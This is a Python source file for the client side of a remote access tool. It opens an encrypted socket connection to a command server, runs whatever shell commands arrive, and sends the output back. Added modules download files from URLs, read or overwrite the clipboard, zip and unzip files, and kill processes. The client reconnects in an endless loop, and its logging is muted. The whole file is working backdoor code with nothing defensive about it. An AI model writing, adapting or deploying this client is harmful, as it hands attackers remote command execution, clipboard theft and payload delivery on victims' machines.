import os
import pathlib
import shutil
import signal
import socket
import struct
import subprocess
import sys
import time
import logging
from multiprocessing import Process, Queue

import requests
from cryptography.fernet import Fernet

logging.basicConfig(level=logging.CRITICAL)

commands = '\nAvaliable Modules\n'

commands += '- download {url} (Downloads file from URL)\n'
commands += '- threads (see running threads)\n'
commands += '- kill {pid} (kills a thread with pid)\n'

try:
    import pyperclip
    commands += '- key/gclip (Copys clipboard)\n'
    commands += '- key/fclip {Text} (Fills clipboard)\n'
    _pyperclip = True
except Exception as e:
    logging.debug(f'pyperclip not installed: {e}')
    _pyperclip = False

try:
    import zipfile
    commands += '- unzip {Zip file} (Unzips a file)\n'
    commands += '- zip {file} ( Zips a file)\n'
    _zipfile = True
except Exception as e:
    logging.debug('zipfile import error: {}'.format(e))
    _zipfile = False

def shell(q, data):
    try:
        cmd = subprocess.Popen(data[:].decode(), shell=True, stdout=subprocess.PIPE,
                                stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        output_bytes = cmd.stdout.read() + cmd.stderr.read()
        q.put(output_bytes.decode(errors="replace"))
    except Exception as e:
        # TODO: Error description is lost
        q.put("Command execution unsuccessful: %s" %str(e))
    return



class Client(object):

    def __init__(self):
        self.serverHost = '127.0.0.1'
        self.serverPort = 9999
        self.socket = None
        self.q = Queue()
        self.Threads = []
        # Time to wait for threads to finish
        self.WAIT_TIME = 10
        # Generate Key
        # key = Fernet.generate_key()

        key = b'k_1i71JWlLTHt8N185PUXjFFzu27DnEH2sXNy-aoG30='
        self.Crypt = Fernet(key)

    def register_signal_handler(self):
        signal.signal(signal.SIGINT, self.quit_gracefully)
        signal.signal(signal.SIGTERM, self.quit_gracefully)
        return

    def quit_gracefully(self, signal=None, frame=None):
        print('\nQuitting gracefully')
        if self.socket:
            try:
                self.socket.shutdown(2)
                self.socket.close()
            except Exception as e:
                logging.error('Could not close connection %s' % str(e))
                # continue
        sys.exit(0)
        return

    def socket_create(self):
        """ Create a socket """
        try:
            self.socket = socket.socket()
        except socket.error as e:
            logging.error("Socket creation error" + str(e))
            return
        return

    def socket_connect(self):
        """ Connect to a remote socket """
        try:
            self.socket.connect((self.serverHost, self.serverPort))
        except socket.error as e:
            logging.error("Socket connection error: " + str(e))
            time.sleep(5)
            raise
        try:
            encrypted_host = self.Crypt.encrypt(socket.gethostname().encode())
            self.socket.send(encrypted_host)
        except socket.error as e:
            logging.error("Cannot send hostname to server: " + str(e))
            raise
        return

    def print_output(self, output_str : str, add_cwd = True):
        """ Prints command output """
        logging.debug('Sending data:{}'.format(output_str))
        if add_cwd:
            output_str = output_str + str(os.getcwd()) + '> '
        sent_message = self.Crypt.encrypt(output_str.encode())
        self.socket.send(struct.pack('>I', len(sent_message)) + sent_message)
        logging.debug('Sending Encypted data: {}'.format(sent_message))
        return


    def check_custom_commands(self, data : bytes):
        """ Check for Custom command triggers in data """
        data = data.decode()
        if data[:2].lower() == 'cd':
            directory = data[3:]
            try:
                os.chdir(directory.strip())
            except Exception as e:
                return "Could not change directory: %s\n" %str(e)
            else: 
                return ""
        if data[:7].lower() == 'modules':
            return commands
        if data[:4].lower() == 'kill':
            pid = data[5:].strip()
            try:
                pid = int(pid)
            except:
                return 'PID has to be a integer'
            for thr in self.Threads:
                if thr[0].is_alive():
                    if thr[0].pid == pid:
                        thr[0].terminate()
                        return "Killed PID:{} Successfully".format(pid)
                else:
                    self.Threads.remove(thr)
            return "PID: {} is invalid or is already killed".format(pid)
        if data[:7].lower() == 'threads':
            return_threads = "Threads:\n\n"
            for thr in self.Threads:
                if thr[0].is_alive():
                    return_threads += "PID: {} - {}".format(thr[0].pid, thr[1])
                else:
                    self.Threads.remove(thr)
            return return_threads
        if data[:8].lower() == 'download':
            try:
                url = data[9:]
                filename = os.path.basename(url)
                with requests.get(url, stream=True) as r:
                    with open(filename, 'wb') as f:
                        shutil.copyfileobj(r.raw, f)
            except Exception as e:
                return "Error downloading file {}".format(e)
            return 'Downloaded {0} successfully.'.format(filename)
        if data[:9].lower() == 'key/gclip':
            if _pyperclip:
                return pyperclip.paste()
            return "key/gclip not avaliable: pyperclip import failed"
        if data[:9].lower() == 'key/fclip':
            if _pyperclip:
                pyperclip.copy(data[10:])
                return "Copied to clipboard successfully."
            return "key/fclip not avaliable: pyperclip import failed"
        if data[:3].lower() == 'zip':
            if _zipfile:
                output_file = os.path.splitext(data[4:])[0] + ".zip"
                zipfile.ZipFile(os.path.splitext(data[4:])[0] + ".zip", mode='w').write(data[4:])
                return "{} zipped to {}".format(data[4:], output_file)
            return "zip not avaliable: zipfile import failed"
        if data[:5].lower() == 'unzip':
            if _zipfile:
                with zipfile.ZipFile(data[6:], 'r') as f:
                    f.extractall(pathlib.Path().absolute())
                return "Extracted {} to {}".format(data[6:], pathlib.Path().absolute())
            return "unzip not avaliable: zipfile import failed"
        return None


    def receive_commands(self):
        """ Receive commands from remote server and run on local machine """
        try:
            self.socket.recv(1024)
        except Exception as e:
            logging.error('Could not start communication with server: %s\n' %str(e))
            return
        cwd = self.Crypt.encrypt(str(os.getcwd() + '> ').encode())
        logging.debug('Sending data: {}'.format(cwd))
        self.socket.send(struct.pack('>I', len(cwd)) + cwd)
        while True:
            output_str = None
            data = self.socket.recv(20480)
            logging.debug('Received data: {}'.format(data))
            try:
                data = self.Crypt.decrypt(data)
                logging.debug('Decrypted data: {}'.format(data))
            except Exception as e:
                logging.error("Decryption Error: {}".format(e))
                break
            if data == b' ':
                self.print_output('')
                continue
            if data[:].decode().lower() == 'quit':
                self.print_output('Quitting...\n', add_cwd=False)
                self.socket.close()
                break
            try:
                output_str = self.check_custom_commands(data)
            except Exception as e:
                output_str = "Custom command failed: {}".format(e)
            if (output_str == None) and len(data) > 0:

                self.Threads.append((Process(target=shell, args=(self.q, data)), data))
                self.Threads[-1][0].daemon = True
                self.Threads[-1][0].start()
                self.Threads[-1][0].join(self.WAIT_TIME)
                if self.Threads[-1][0].is_alive():
                    output_str = "Command took too long... Will keep running in background."
                else:
                    output_str = self.q.get()
                    self.Threads.pop(-1)

            try: 
                if output_str is not None:
                    self.print_output(output_str + "\n")
                else:
                    self.print_output(' ')
            except Exception as e:
                logging.error('Cannot send command output: %s' %str(e))

        self.socket.close()
        return

def main():
    client = Client()
    client.register_signal_handler()
    client.socket_create()
    while True:
        try:
            client.socket_connect()
        except Exception as e:
            logging.error("Error on socket connections: %s" %str(e))
            time.sleep(5)     
        else:
            break
    try:
        client.receive_commands()
    except Exception as e:
        logging.critical('Error in main: ' + str(e))
    client.socket.close()
    return

if __name__ == '__main__':
    while True:
        main()
